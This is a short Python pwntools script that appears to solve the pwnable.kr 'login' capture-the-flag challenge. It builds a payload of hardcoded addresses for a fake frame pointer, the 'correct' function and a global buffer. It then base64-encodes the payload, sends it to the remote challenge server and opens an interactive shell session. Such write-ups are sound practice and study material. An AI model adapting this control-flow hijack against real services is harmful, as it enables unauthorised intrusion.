from pwn import *

def GDB():
	gdb.attach(r, '''
					b *(main + 280)
					c
				''')

context.arch = 'i386'

elf = ELF('./login')

correct = 0x08049278
g_buf = 0x0811eb40

payload = p32(0xffffffff) + p32(correct) + p32(g_buf)
payload = payload.encode('base64').strip()

#r = process('./login')
r = remote('pwnable.kr', 9003)
#GDB()
r.recvuntil(': ')
r.sendline(payload)
r.interactive()